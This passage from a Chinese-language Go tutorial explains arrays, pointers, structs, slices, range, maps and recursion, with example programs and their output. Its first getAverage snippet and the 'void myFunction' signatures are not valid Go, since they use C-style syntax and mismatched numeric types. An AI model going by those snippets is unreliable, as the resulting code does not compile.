开始，第一个元素索引为 0，第二个索引为 1，以此类推。\n\n\n访问数组元素数组元素可以通过索引（位置）来读取。格式为数组名后加中括号，中括号中为索引的值。例如：\nvar salary float32 = balance[9]\n\n以上实例读取了数组 balance 第 10 个元素的值。\n以下演示了数组完整操作（声明、赋值、访问）的实例：\npackage mainimport &quot;fmt&quot;func main() &#123;   var n [10]int /* n 是一个长度为 10 的数组 */   var i,j int   /* 为数组 n 初始化元素 */           for i = 0; i &lt; 10; i++ &#123;      n[i] = i + 100 /* 设置元素为 i + 100 */   &#125;   /* 输出每个数组元素的值 */   for j = 0; j &lt; 10; j++ &#123;      fmt.Printf(&quot;Element[%d] = %d\\n&quot;, j, n[j] )   &#125;&#125;\n\n以上实例执行结果如下：\nElement[0] = 100Element[1] = 101Element[2] = 102Element[3] = 103Element[4] = 104Element[5] = 105Element[6] = 106Element[7] = 107Element[8] = 108Element[9] = 109\n\n实例2\npackage mainimport &quot;fmt&quot;func main() &#123;   var i,j,k int   // 声明数组的同时快速初始化数组   balance := [5]float32&#123;1000.0, 2.0, 3.4, 7.0, 50.0&#125;   /* 输出数组元素 */         ...   for i = 0; i &lt; 5; i++ &#123;      fmt.Printf(&quot;balance[%d] = %f\\n&quot;, i, balance[i] )   &#125;      balance2 := [...]float32&#123;1000.0, 2.0, 3.4, 7.0, 50.0&#125;   /* 输出每个数组元素的值 */   for j = 0; j &lt; 5; j++ &#123;      fmt.Printf(&quot;balance2[%d] = %f\\n&quot;, j, balance2[j] )   &#125;   //  将索引为 1 和 3 的元素初始化   balance3 := [5]float32&#123;1:2.0,3:7.0&#125;     for k = 0; k &lt; 5; k++ &#123;      fmt.Printf(&quot;balance3[%d] = %f\\n&quot;, k, balance3[k] )   &#125;&#125;\n\n以上实例执行结果如下：\nbalance[0] = 1000.000000balance[1] = 2.000000balance[2] = 3.400000balance[3] = 7.000000balance[4] = 50.000000balance2[0] = 1000.000000balance2[1] = 2.000000balance2[2] = 3.400000balance2[3] = 7.000000balance2[4] = 50.000000balance3[0] = 0.000000balance3[1] = 2.000000balance3[2] = 0.000000balance3[3] = 7.000000balance3[4] = 0.000000\n\n\n更多内容数组对 Go 语言来说是非常重要的，以下我们将介绍数组更多的内容：\n\n\n\n内容\n描述\n\n\n\n多维数组\nGo 语言支持多维数组，最简单的多维数组是二维数组\n\n\n向函数传递数组\n你可以向函数传递数组参数\n\n\nGo 语言多维数组Go 语言支持多维数组，以下为常用的多维数组声明方式：\nvar variable_name [SIZE1][SIZE2]...[SIZEN] variable_type\n\n以下实例声明了三维的整型数组：\nvar threedim [5][10][4]int\n\n\n二维数组二维数组是最简单的多维数组，二维数组本质上是由一维数组组成的。二维数组定义方式如下：\nvar arrayName [ x ][ y ] variable_type\n\nvariable_type 为 Go 语言的数据类型，arrayName 为数组名，二维数组可认为是一个表格，x 为行，y 为列，下图演示了一个二维数组 a 为三行四列：\n\n二维数组中的元素可通过a[ i ][ j ]来访问。\npackage mainimport &quot;fmt&quot;func main() &#123;    // Step 1: 创建数组    values := [][]int&#123;&#125;    // Step 2: 使用 appped() 函数向空的二维数组添加两行一维数组    row1 := []int&#123;1, 2, 3&#125;    row2 := []int&#123;4, 5, 6&#125;    values = append(values, row1)    values = append(values, row2)    // Step 3: 显示两行数据    fmt.Println(&quot;Row 1&quot;)    fmt.Println(values[0])    fmt.Println(&quot;Row 2&quot;)    fmt.Println(values[1])    // Step 4: 访问第一个元素    fmt.Println(&quot;第一个元素为：&quot;)    fmt.Println(values[0][0])&#125;\n\n以上实例运行输出结果为：\nRow 1[1 2 3]Row 2[4 5 6]第一个元素为：1\n\n\n初始化二维数组多维数组可通过大括号来初始值。以下实例为一个 3 行 4 列的二维数组：\na := [3][4]int&#123;   &#123;0, 1, 2, 3&#125; ,   /*  第一行索引为 0 */ &#123;4, 5, 6, 7&#125; ,   /*  第二行索引为 1 */ &#123;8, 9, 10, 11&#125;,   /* 第三行索引为 2 */&#125;\n\n注意：以上代码中倒数第二行的 } 必须要有逗号，因为最后一行的 } 不能单独一行，也可以写成这样：\na := [3][4]int&#123;   &#123;0, 1, 2, 3&#125; ,   /*  第一行索引为 0 */ &#123;4, 5, 6, 7&#125; ,   /*  第二行索引为 1 */ &#123;8, 9, 10, 11&#125;&#125;   /* 第三行索引为 2 */\n\n以下实例初始化一个 2 行 2 列 的二维数组：\npackage mainimport &quot;fmt&quot;func main() &#123;    // 创建二维数组    sites := [2][2]string&#123;&#125;    // 向二维数组添加元素    sites[0][0] = &quot;Google&quot;    sites[0][1] = &quot;Runoob&quot;    sites[1][0] = &quot;Taobao&quot;    sites[1][1] = &quot;Weibo&quot;    // 显示结果    fmt.Println(sites)&#125;\n\n以上实例运行输出结果为：\n[[Google Runoob] [Taobao Weibo]]\n\n\n访问二维数组二维数组通过指定坐标来访问。如数组中的行索引与列索引，例如：\nval := a[2][3]或var value int = a[2][3]\n\n以上实例访问了二维数组 val 第三行的第四个元素。\n二维数组可以使用循环嵌套来输出元素：\npackage mainimport &quot;fmt&quot;func main() &#123;   /* 数组 - 5 行 2 列*/   var a = [5][2]int&#123; &#123;0,0&#125;, &#123;1,2&#125;, &#123;2,4&#125;, &#123;3,6&#125;,&#123;4,8&#125;&#125;   var i, j int   /* 输出数组元素 */   for  i = 0; i &lt; 5; i++ &#123;      for j = 0; j &lt; 2; j++ &#123;         fmt.Printf(&quot;a[%d][%d] = %d\\n&quot;, i,j, a[i][j] )      &#125;   &#125;&#125;\n\n以上实例运行输出结果为：\na[0][0] = 0a[0][1] = 0a[1][0] = 1a[1][1] = 2a[2][0] = 2a[2][1] = 4a[3][0] = 3a[3][1] = 6a[4][0] = 4a[4][1] = 8\n\n以下实例创建各个维度元素数量不一致的多维数组：\npackage mainimport &quot;fmt&quot;func main() &#123;    // 创建空的二维数组    animals := [][]string&#123;&#125;    // 创建三一维数组，各数组长度不同    row1 := []string&#123;&quot;fish&quot;, &quot;shark&quot;, &quot;eel&quot;&#125;    row2 := []string&#123;&quot;bird&quot;&#125;    row3 := []string&#123;&quot;lizard&quot;, &quot;salamander&quot;&#125;    // 使用 append() 函数将一维数组添加到二维数组中    animals = append(animals, row1)    animals = append(animals, row2)    animals = append(animals, row3)    // 循环输出    for i := range animals &#123;        fmt.Printf(&quot;Row: %v\\n&quot;, i)        fmt.Println(animals[i])    &#125;&#125;\n\n以上实例运行输出结果为：\nRow: 0[fish shark eel]Row: 1[bird]Row: 2[lizard salamander]\n\n\n\n\n\nGo 语言向函数传递数组如果你想向函数传递数组参数，你需要在函数定义时，声明形参为数组，我们可以通过以下两种方式来声明：\n方式一形参设定数组大小：\nvoid myFunction(param [10]int)&#123;...&#125;\n\n方式二形参未设定数组大小：\nvoid myFunction(param []int)&#123;...&#125;\n\n实例让我们看下以下实例，实例中函数接收整型数组参数，另一个参数指定了数组元素的个数，并返回平均值：\nfunc getAverage(arr []int, size int) float32&#123;   var i int   var avg, sum float32     for i = 0; i &lt; size; ++i &#123;      sum += arr[i]   &#125;   avg = sum / size   return avg;&#125;\n\n接下来我们来调用这个函数：\npackage mainimport &quot;fmt&quot;func main() &#123;   /* 数组长度为 5 */   var  balance = [5]int &#123;1000, 2, 3, 17, 50&#125;   var avg float32   /* 数组作为参数传递给函数 */   avg = getAverage( balance, 5 ) ;   /* 输出返回的平均值 */   fmt.Printf( &quot;平均值为: %f &quot;, avg );&#125;func getAverage(arr [5]int, size int) float32 &#123;   var i,sum int   var avg float32     for i = 0; i &lt; size;i++ &#123;      sum += arr[i]   &#125;   avg = float32(sum) / float32(size)   return avg;&#125;\n\n以上实例执行输出结果为：\n平均值为: 214.399994\n\n以上实例中我们使用的形参并未设定数组大小。\n浮点数计算输出有一定的偏差，你也可以转整型来设置精度。\n实例\npackage mainimport (    &quot;fmt&quot;)func main() &#123;    a := 1.69    b := 1.7    c := a * b      // 结果应该是2.873    fmt.Println(c)  // 输出的是2.8729999999999998&#125;\n\n设置固定精度：\npackage mainimport (    &quot;fmt&quot;)func main() &#123;    a := 1690           // 表示1.69    b := 1700           // 表示1.70    c := a * b          // 结果应该是2873000表示 2.873    fmt.Println(c)      // 内部编码    fmt.Println(float64(c) / 1000000) // 显示&#125;\n\n\n\n0x0C Go 语言指针Go 语言中指针是很容易学习的，Go 语言中使用指针可以更简单的执行一些任务。\n接下来让我们来一步步学习 Go 语言指针。\n我们都知道，变量是一种使用方便的占位符，用于引用计算机内存地址。\nGo 语言的取地址符是 &amp;，放到一个变量前使用就会返回相应变量的内存地址。\n以下实例演示了变量在内存中地址：\npackage mainimport &quot;fmt&quot;func main() &#123;   var a int = 10     fmt.Printf(&quot;变量的地址: %x\\n&quot;, &amp;a  )&#125;\n\n执行以上代码输出结果为：\n变量的地址: 20818a220\n\n现在我们已经了解了什么是内存地址和如何去访问它。接下来我们将具体介绍指针。\n\n什么是指针一个指针变量指向了一个值的内存地址。\n类似于变量和常量，在使用指针前你需要声明指针。指针声明格式如下：\nvar var_name *var-type\n\nvar-type 为指针类型，var_name 为指针变量名，* 号用于指定变量是作为一个指针。以下是有效的指针声明：\nvar ip *int        /* 指向整型*/var fp *float32    /* 指向浮点型 */\n\n本例中这是一个指向 int 和 float32 的指针。\n\n如何使用指针指针使用流程：\n\n定义指针变量。\n为指针变量赋值。\n访问指针变量中指向地址的值。\n\n在指针类型前面加上 * 号（前缀）来获取指针所指向的内容。\npackage mainimport &quot;fmt&quot;func main() &#123;   var a int= 20   /* 声明实际变量 */   var ip *int        /* 声明指针变量 */   ip = &amp;a  /* 指针变量的存储地址 */   fmt.Printf(&quot;a 变量的地址是: %x\\n&quot;, &amp;a  )   /* 指针变量的存储地址 */   fmt.Printf(&quot;ip 变量储存的指针地址: %x\\n&quot;, ip )   /* 使用指针访问值 */   fmt.Printf(&quot;*ip 变量的值: %d\\n&quot;, *ip )&#125;\n\n以上实例执行输出结果为：\na 变量的地址是: 20818a220ip 变量储存的指针地址: 20818a220*ip 变量的值: 20\n\nGo 空指针当一个指针被定义后没有分配到任何变量时，它的值为 nil。\nnil 指针也称为空指针。\nnil在概念上和其它语言的null、None、nil、NULL一样，都指代零值或空值。\n一个指针变量通常缩写为 ptr。\n查看以下实例：\npackage mainimport &quot;fmt&quot;func main() &#123;   var  ptr *int   fmt.Printf(&quot;ptr 的值为 : %x\\n&quot;, ptr  )&#125;\n\n以上实例输出结果为：\nptr 的值为 : 0\n\n空指针判断：\nif(ptr != nil)     /* ptr 不是空指针 */if(ptr == nil)    /* ptr 是空指针 */\n\n\nGo指针更多内容接下来我们将为大家介绍Go语言中更多的指针应用：\n\n\n\n内容\n描述\n\n\n\nGo 指针数组\n你可以定义一个指针数组来存储地址\n\n\nGo 指向指针的指针\nGo 支持指向指针的指针\n\n\nGo 向函数传递指针参数\n通过引用或地址传参，在函数调用时可以改变其值\n\n\nGo 语言指针数组在我们了解指针数组前，先看个实例，定义了长度为 3 的整型数组：\npackage mainimport &quot;fmt&quot;const MAX int = 3func main() &#123;   a := []int&#123;10,100,200&#125;   var i int   for i = 0; i &lt; MAX; i++ &#123;      fmt.Printf(&quot;a[%d] = %d\\n&quot;, i, a[i] )   &#125;&#125;\n\n以上代码执行输出结果为：\na[0] = 10a[1] = 100a[2] = 200\n\n有一种情况，我们可能需要保存数组，这样我们就需要使用到指针。\n以下声明了整型指针数组：\nvar ptr [MAX]*int;\n\nptr 为整型指针数组。因此每个元素都指向了一个值。以下实例的三个整数将存储在指针数组中：\npackage mainimport &quot;fmt&quot;const MAX int = 3func main() &#123;   a := []int&#123;10,100,200&#125;   var i int   var ptr [MAX]*int;   for  i = 0; i &lt; MAX; i++ &#123;      ptr[i] = &amp;a[i] /* 整数地址赋值给指针数组 */   &#125;   for  i = 0; i &lt; MAX; i++ &#123;      fmt.Printf(&quot;a[%d] = %d\\n&quot;, i,*ptr[i] )   &#125;&#125;\n\n以上代码执行输出结果为：\na[0] = 10a[1] = 100a[2] = 200\n\n\n\n\n\nGo 语言指向指针的指针如果一个指针变量存放的又是另一个指针变量的地址，则称这个指针变量为指向指针的指针变量。\n当定义一个指向指针的指针变量时，第一个指针存放第二个指针的地址，第二个指针存放变量的地址：\n\n指向指针的指针变量声明格式如下：\nvar ptr **int;\n\n以上指向指针的指针变量为整型。\n访问指向指针的指针变量值需要使用两个 * 号，如下所示：\npackage mainimport &quot;fmt&quot;func main() &#123;   var a int   var ptr *int   var pptr **int   a = 3000   /* 指针 ptr 地址 */   ptr = &amp;a   /* 指向指针 ptr 地址 */   pptr = &amp;ptr   /* 获取 pptr 的值 */   fmt.Printf(&quot;变量 a = %d\\n&quot;, a )   fmt.Printf(&quot;指针变量 *ptr = %d\\n&quot;, *ptr )   fmt.Printf(&quot;指向指针的指针变量 **pptr = %d\\n&quot;, **pptr)&#125;\n\n以上实例执行输出结果为：\n变量 a = 3000指针变量 *ptr = 3000指向指针的指针变量 **pptr = 3000\n\n\n\nGo 语言指针作为函数参数Go 语言允许向函数传递指针，只需要在函数定义的参数上设置为指针类型即可。\n以下实例演示了如何向函数传递指针，并在函数调用后修改函数内的值\npackage mainimport &quot;fmt&quot;func main() &#123;   /* 定义局部变量 */   var a int = 100   var b int= 200   fmt.Printf(&quot;交换前 a 的值 : %d\\n&quot;, a )   fmt.Printf(&quot;交换前 b 的值 : %d\\n&quot;, b )   /* 调用函数用于交换值   * &amp;a 指向 a 变量的地址   * &amp;b 指向 b 变量的地址   */   swap(&amp;a, &amp;b);   fmt.Printf(&quot;交换后 a 的值 : %d\\n&quot;, a )   fmt.Printf(&quot;交换后 b 的值 : %d\\n&quot;, b )&#125;func swap(x *int, y *int) &#123;   var temp int   temp = *x    /* 保存 x 地址的值 */   *x = *y      /* 将 y 赋值给 x */   *y = temp    /* 将 temp 赋值给 y */&#125;\n\n\n\n以上实例允许输出结果为：\n交换前 a 的值 : 100交换前 b 的值 : 200交换后 a 的值 : 200交换后 b 的值 : 100\n\n\n\n\n\n0x0D Go 语言结构体Go 语言中数组可以存储同一类型的数据，但在结构体中我们可以为不同项定义不同的数据类型。\n结构体是由一系列具有相同类型或不同类型的数据构成的数据集合。\n结构体表示一项记录，比如保存图书馆的书籍记录，每本书有以下属性：\n\nTitle ：标题\nAuthor ： 作者\nSubject：学科\nID：书籍ID\n\n\n定义结构体结构体定义需要使用 type 和 struct 语句。struct 语句定义一个新的数据类型，结构体中有一个或多个成员。type 语句设定了结构体的名称。结构体的格式如下：\ntype struct_variable_type struct &#123;   member definition   member definition   ...   member definition&#125;\n\n一旦定义了结构体类型，它就能用于变量的声明，语法格式如下：\nvariable_name := structure_variable_type &#123;value1, value2...valuen&#125;或variable_name := structure_variable_type &#123; key1: value1, key2: value2..., keyn: valuen&#125;\n\n实例如下：\npackage mainimport &quot;fmt&quot;type Books struct &#123;   title string   author string   subject string   book_id int&#125;func main() &#123;    // 创建一个新的结构体    fmt.Println(Books&#123;&quot;Go 语言&quot;, &quot;www.runoob.com&quot;, &quot;Go 语言教程&quot;, 6495407&#125;)    // 也可以使用 key =&gt; value 格式    fmt.Println(Books&#123;title: &quot;Go 语言&quot;, author: &quot;www.runoob.com&quot;, subject: &quot;Go 语言教程&quot;, book_id: 6495407&#125;)    // 忽略的字段为 0 或 空   fmt.Println(Books&#123;title: &quot;Go 语言&quot;, author: &quot;www.runoob.com&quot;&#125;)&#125;\n\n输出结果为：\n&#123;Go 语言 www.runoob.com Go 语言教程 6495407&#125;&#123;Go 语言 www.runoob.com Go 语言教程 6495407&#125;&#123;Go 语言 www.runoob.com  0&#125;\n\n\n访问结构体成员如果要访问结构体成员，需要使用点号 . 操作符，格式为：\n结构体.成员名&quot;\n\n结构体类型变量使用 struct 关键字定义，实例如下：\npackage mainimport &quot;fmt&quot;type Books struct &#123;   title string   author string   subject string   book_id int&#125;func main() &#123;   var Book1 Books        /* 声明 Book1 为 Books 类型 */   var Book2 Books        /* 声明 Book2 为 Books 类型 */   /* book 1 描述 */   Book1.title = &quot;Go 语言&quot;   Book1.author = &quot;www.runoob.com&quot;   Book1.subject = &quot;Go 语言教程&quot;   Book1.book_id = 6495407   /* book 2 描述 */   Book2.title = &quot;Python 教程&quot;   Book2.author = &quot;www.runoob.com&quot;   Book2.subject = &quot;Python 语言教程&quot;   Book2.book_id = 6495700   /* 打印 Book1 信息 */   fmt.Printf( &quot;Book 1 title : %s\\n&quot;, Book1.title)   fmt.Printf( &quot;Book 1 author : %s\\n&quot;, Book1.author)   fmt.Printf( &quot;Book 1 subject : %s\\n&quot;, Book1.subject)   fmt.Printf( &quot;Book 1 book_id : %d\\n&quot;, Book1.book_id)   /* 打印 Book2 信息 */   fmt.Printf( &quot;Book 2 title : %s\\n&quot;, Book2.title)   fmt.Printf( &quot;Book 2 author : %s\\n&quot;, Book2.author)   fmt.Printf( &quot;Book 2 subject : %s\\n&quot;, Book2.subject)   fmt.Printf( &quot;Book 2 book_id : %d\\n&quot;, Book2.book_id)&#125;\n\n以上实例执行运行结果为：\nBook 1 title : Go 语言Book 1 author : www.runoob.comBook 1 subject : Go 语言教程Book 1 book_id : 6495407Book 2 title : Python 教程Book 2 author : www.runoob.comBook 2 subject : Python 语言教程Book 2 book_id : 6495700\n\n\n结构体作为函数参数你可以像其他数据类型一样将结构体类型作为参数传递给函数。并以以上实例的方式访问结构体变量：\npackage mainimport &quot;fmt&quot;type Books struct &#123;   title string   author string   subject string   book_id int&#125;func main() &#123;   var Book1 Books        /* 声明 Book1 为 Books 类型 */   var Book2 Books        /* 声明 Book2 为 Books 类型 */   /* book 1 描述 */   Book1.title = &quot;Go 语言&quot;   Book1.author = &quot;www.runoob.com&quot;   Book1.subject = &quot;Go 语言教程&quot;   Book1.book_id = 6495407   /* book 2 描述 */   Book2.title = &quot;Python 教程&quot;   Book2.author = &quot;www.runoob.com&quot;   Book2.subject = &quot;Python 语言教程&quot;   Book2.book_id = 6495700   /* 打印 Book1 信息 */   printBook(Book1)   /* 打印 Book2 信息 */   printBook(Book2)&#125;func printBook( book Books ) &#123;   fmt.Printf( &quot;Book title : %s\\n&quot;, book.title)   fmt.Printf( &quot;Book author : %s\\n&quot;, book.author)   fmt.Printf( &quot;Book subject : %s\\n&quot;, book.subject)   fmt.Printf( &quot;Book book_id : %d\\n&quot;, book.book_id)&#125;\n\n以上实例执行运行结果为：\nBook title : Go 语言Book author : www.runoob.comBook subject : Go 语言教程Book book_id : 6495407Book title : Python 教程Book author : www.runoob.comBook subject : Python 语言教程Book book_id : 6495700\n\n\n结构体指针你可以定义指向结构体的指针类似于其他指针变量，格式如下：\nvar struct_pointer *Books\n\n以上定义的指针变量可以存储结构体变量的地址。查看结构体变量地址，可以将 &amp; 符号放置于结构体变量前：\nstruct_pointer = &amp;Book1\n\n使用结构体指针访问结构体成员，使用 “.” 操作符：\nstruct_pointer.title\n\n接下来让我们使用结构体指针重写以上实例，代码如下：\npackage mainimport &quot;fmt&quot;type Books struct &#123;   title string   author string   subject string   book_id int&#125;func main() &#123;   var Book1 Books        /* 声明 Book1 为 Books 类型 */   var Book2 Books        /* 声明 Book2 为 Books 类型 */   /* book 1 描述 */   Book1.title = &quot;Go 语言&quot;   Book1.author = &quot;www.runoob.com&quot;   Book1.subject = &quot;Go 语言教程&quot;   Book1.book_id = 6495407   /* book 2 描述 */   Book2.title = &quot;Python 教程&quot;   Book2.author = &quot;www.runoob.com&quot;   Book2.subject = &quot;Python 语言教程&quot;   Book2.book_id = 6495700   /* 打印 Book1 信息 */   printBook(&amp;Book1)   /* 打印 Book2 信息 */   printBook(&amp;Book2)&#125;func printBook( book *Books ) &#123;   fmt.Printf( &quot;Book title : %s\\n&quot;, book.title)   fmt.Printf( &quot;Book author : %s\\n&quot;, book.author)   fmt.Printf( &quot;Book subject : %s\\n&quot;, book.subject)   fmt.Printf( &quot;Book book_id : %d\\n&quot;, book.book_id)&#125;\n\n以上实例执行运行结果为：\nBook title : Go 语言Book author : www.runoob.comBook subject : Go 语言教程Book book_id : 6495407Book title : Python 教程Book author : www.runoob.comBook subject : Python 语言教程Book book_id : 6495700\n\n\n\n\n\n0x0E Go 语言切片(Slice)Go 语言切片是对数组的抽象。\nGo 数组的长度不可改变，在特定场景中这样的集合就不太适用，Go 中提供了一种灵活，功能强悍的内置类型切片(“动态数组”)，与数组相比切片的长度是不固定的，可以追加元素，在追加时可能使切片的容量增大。\n\n定义切片你可以声明一个未指定大小的数组来定义切片：\nvar identifier []type\n\n切片不需要说明长度。\n或使用 make() 函数来创建切片:\nvar slice1 []type = make([]type, len)也可以简写为slice1 := make([]type, len)\n\n也可以指定容量，其中 capacity 为可选参数。\nmake([]T, length, capacity)\n\n这里 len 是数组的长度并且也是切片的初始长度。\n切片初始化s :=[] int &#123;1,2,3 &#125; \n\n直接初始化切片，**[]** 表示是切片类型，**{1,2,3}** 初始化值依次是 1,2,3，其 cap&#x3D;len&#x3D;3。\ns := arr[:] \n\n初始化切片 s，是数组 arr 的引用。\ns := arr[startIndex:endIndex] \n\n将 arr 中从下标 startIndex 到 endIndex-1 下的元素创建为一个新的切片。\ns := arr[startIndex:] \n\n默认 endIndex 时将表示一直到arr的最后一个元素。\ns := arr[:endIndex] \n\n默认 startIndex 时将表示从 arr 的第一个元素开始。\ns1 := s[startIndex:endIndex] \n\n通过切片 s 初始化切片 s1。\ns :=make([]int,len,cap) \n\n通过内置函数 make() 初始化切片s，**[]int** 标识为其元素类型为 int 的切片。\n\nlen() 和 cap() 函数切片是可索引的，并且可以由 len() 方法获取长度。\n切片提供了计算容量的方法 cap() 可以测量切片最长可以达到多少。\n以下为具体实例：\npackage mainimport &quot;fmt&quot;func main() &#123;   var numbers = make([]int,3,5)   printSlice(numbers)&#125;func printSlice(x []int)&#123;   fmt.Printf(&quot;len=%d cap=%d slice=%v\\n&quot;,len(x),cap(x),x)&#125;\n\n以上实例运行输出结果为:\nlen=3 cap=5 slice=[0 0 0]\n\n空(nil)切片一个切片在未初始化之前默认为 nil，长度为 0，实例如下：\npackage mainimport &quot;fmt&quot;func main() &#123;   var numbers []int   printSlice(numbers)   if(numbers == nil)&#123;      fmt.Printf(&quot;切片是空的&quot;)   &#125;&#125;func printSlice(x []int)&#123;   fmt.Printf(&quot;len=%d cap=%d slice=%v\\n&quot;,len(x),cap(x),x)&#125;\n\n以上实例运行输出结果为:\nlen=0 cap=0 slice=[]切片是空的\n\n\n切片截取可以通过设置下限及上限来设置截取切片 *[lower-bound:upper-bound]*，实例如下：\npackage mainimport &quot;fmt&quot;func main() &#123;   /* 创建切片 */   numbers := []int&#123;0,1,2,3,4,5,6,7,8&#125;     printSlice(numbers)   /* 打印原始切片 */   fmt.Println(&quot;numbers ==&quot;, numbers)   /* 打印子切片从索引1(包含) 到索引4(不包含)*/   fmt.Println(&quot;numbers[1:4] ==&quot;, numbers[1:4])   /* 默认下限为 0*/   fmt.Println(&quot;numbers[:3] ==&quot;, numbers[:3])   /* 默认上限为 len(s)*/   fmt.Println(&quot;numbers[4:] ==&quot;, numbers[4:])   numbers1 := make([]int,0,5)   printSlice(numbers1)   /* 打印子切片从索引  0(包含) 到索引 2(不包含) */   number2 := numbers[:2]   printSlice(number2)   /* 打印子切片从索引 2(包含) 到索引 5(不包含) */   number3 := numbers[2:5]   printSlice(number3)&#125;func printSlice(x []int)&#123;   fmt.Printf(&quot;len=%d cap=%d slice=%v\\n&quot;,len(x),cap(x),x)&#125;\n\n执行以上代码输出结果为：\nlen=9 cap=9 slice=[0 1 2 3 4 5 6 7 8]numbers == [0 1 2 3 4 5 6 7 8]numbers[1:4] == [1 2 3]numbers[:3] == [0 1 2]numbers[4:] == [4 5 6 7 8]len=0 cap=5 slice=[]len=2 cap=9 slice=[0 1]len=3 cap=7 slice=[2 3 4]\n\nappend() 和 copy() 函数如果想增加切片的容量，我们必须创建一个新的更大的切片并把原分片的内容都拷贝过来。\n下面的代码描述了从拷贝切片的 copy 方法和向切片追加新元素的 append 方法。\npackage mainimport &quot;fmt&quot;func main() &#123;   var numbers []int   printSlice(numbers)   /* 允许追加空切片 */   numbers = append(numbers, 0)   printSlice(numbers)   /* 向切片添加一个元素 */   numbers = append(numbers, 1)   printSlice(numbers)   /* 同时添加多个元素 */   numbers = append(numbers, 2,3,4)   printSlice(numbers)   /* 创建切片 numbers1 是之前切片的两倍容量*/   numbers1 := make([]int, len(numbers), (cap(numbers))*2)   /* 拷贝 numbers 的内容到 numbers1 */   copy(numbers1,numbers)   printSlice(numbers1)  &#125;func printSlice(x []int)&#123;   fmt.Printf(&quot;len=%d cap=%d slice=%v\\n&quot;,len(x),cap(x),x)&#125;\n\n以上代码执行输出结果为：\nlen=0 cap=0 slice=[]len=1 cap=1 slice=[0]len=2 cap=2 slice=[0 1]len=5 cap=6 slice=[0 1 2 3 4]len=5 cap=12 slice=[0 1 2 3 4]\n\n\n\n\n\n0x0F Go 语言范围(Range)Go 语言中 range 关键字用于 for 循环中迭代数组(array)、切片(slice)、通道(channel)或集合(map)的元素。在数组和切片中它返回元素的索引和索引对应的值，在集合中返回 key-value 对。\npackage mainimport &quot;fmt&quot;func main() &#123;    //这是我们使用range去求一个slice的和。使用数组跟这个很类似    nums := []int&#123;2, 3, 4&#125;    sum := 0    for _, num := range nums &#123;        sum += num    &#125;    fmt.Println(&quot;sum:&quot;, sum)    //在数组上使用range将传入index和值两个变量。上面那个例子我们不需要使用该元素的序号，所以我们使用空白符&quot;_&quot;省略了。有时侯我们确实需要知道它的索引。    for i, num := range nums &#123;        if num == 3 &#123;            fmt.Println(&quot;index:&quot;, i)        &#125;    &#125;    //range也可以用在map的键值对上。    kvs := map[string]string&#123;&quot;a&quot;: &quot;apple&quot;, &quot;b&quot;: &quot;banana&quot;&#125;    for k, v := range kvs &#123;        fmt.Printf(&quot;%s -&gt; %s\\n&quot;, k, v)    &#125;    //range也可以用来枚举Unicode字符串。第一个参数是字符的索引，第二个是字符（Unicode的值）本身。    for i, c := range &quot;go&quot; &#123;        fmt.Println(i, c)    &#125;&#125;\n\n以上实例运行输出结果为：\nsum: 9index: 1a -&gt; appleb -&gt; banana0 1031 111\n\n\n\n\n\n0x10 Go 语言Map(集合)Map 是一种无序的键值对的集合。Map 最重要的一点是通过 key 来快速检索数据，key 类似于索引，指向数据的值。\nMap 是一种集合，所以我们可以像迭代数组和切片那样迭代它。不过，Map 是无序的，我们无法决定它的返回顺序，这是因为 Map 是使用 hash 表来实现的。\n定义 Map可以使用内建函数 make 也可以使用 map 关键字来定义 Map:\n/* 声明变量，默认 map 是 nil */var map_variable map[key_data_type]value_data_type/* 使用 make 函数 */map_variable := make(map[key_data_type]value_data_type)\n\n如果不初始化 map，那么就会创建一个 nil map。nil map 不能用来存放键值对\n下面实例演示了创建和使用map:\npackage mainimport &quot;fmt&quot;func main() &#123;    var countryCapitalMap map[string]string /*创建集合 */    countryCapitalMap = make(map[string]string)    /* map插入key - value对,各个国家对应的首都 */    countryCapitalMap [ &quot;France&quot; ] = &quot;巴黎&quot;    countryCapitalMap [ &quot;Italy&quot; ] = &quot;罗马&quot;    countryCapitalMap [ &quot;Japan&quot; ] = &quot;东京&quot;    countryCapitalMap [ &quot;India &quot; ] = &quot;新德里&quot;    /*使用键输出地图值 */    for country := range countryCapitalMap &#123;        fmt.Println(country, &quot;首都是&quot;, countryCapitalMap [country])    &#125;    /*查看元素在集合中是否存在 */    capital, ok := countryCapitalMap [ &quot;American&quot; ] /*如果确定是真实的,则存在,否则不存在 */    /*fmt.Println(capital) */    /*fmt.Println(ok) */    if (ok) &#123;        fmt.Println(&quot;American 的首都是&quot;, capital)    &#125; else &#123;        fmt.Println(&quot;American 的首都不存在&quot;)    &#125;&#125;\n\n以上实例运行结果为：\nFrance 首都是 巴黎Italy 首都是 罗马Japan 首都是 东京India  首都是 新德里American 的首都不存在\n\ndelete() 函数delete() 函数用于删除集合的元素, 参数为 map 和其对应的 key。实例如下：\npackage mainimport &quot;fmt&quot;func main() &#123;        /* 创建map */        countryCapitalMap := map[string]string&#123;&quot;France&quot;: &quot;Paris&quot;, &quot;Italy&quot;: &quot;Rome&quot;, &quot;Japan&quot;: &quot;Tokyo&quot;, &quot;India&quot;: &quot;New delhi&quot;&#125;        fmt.Println(&quot;原始地图&quot;)        /* 打印地图 */        for country := range countryCapitalMap &#123;                fmt.Println(country, &quot;首都是&quot;, countryCapitalMap [ country ])        &#125;        /*删除元素*/ delete(countryCapitalMap, &quot;France&quot;)        fmt.Println(&quot;法国条目被删除&quot;)        fmt.Println(&quot;删除元素后地图&quot;)        /*打印地图*/        for country := range countryCapitalMap &#123;                fmt.Println(country, &quot;首都是&quot;, countryCapitalMap [ country ])        &#125;&#125;\n\n以上实例运行结果为：\n原始地图India 首都是 New delhiFrance 首都是 ParisItaly 首都是 RomeJapan 首都是 Tokyo法国条目被删除删除元素后地图Italy 首都是 RomeJapan 首都是 TokyoIndia 首都是 New delhi\n\n\n\n\n\n0x11 Go 语言递归函数递归，就是在运行的过程中调用自己。\n语法格式如下：\nfunc recursion() &#123;   recursion() /* 函数调用自身 */&#125;func main() &#123;   recursion()&#125;\n\nGo 语言支持递归。但我们在使用递归时，开发者需要设置退出条件，否则递归将陷入无限循环中。\n递归函数对于解决数学上的问题是非常有用的，就像计算阶乘，生成斐波那契数列等。\n\n阶乘以下实例通过 Go 语言的递归函数实例阶乘：\npackage mainimport &quot;fmt&quot;func Factorial(n uint64)(result uint64) &#123;    if (n &gt; 0) &#123;        result = n * Factorial(n-1)        return result    &#125;    return 1&#125;func main() &#123;      var i int = 15    fmt.Printf(&quot;%d 的阶乘是 %d\\n&quot;, i, Factorial(uint64(i)))&#125;\n\n以上实例执行输出结果为：\n15 的阶乘是 1307674368000\n\n\n斐波那契数列以下实例通过 Go 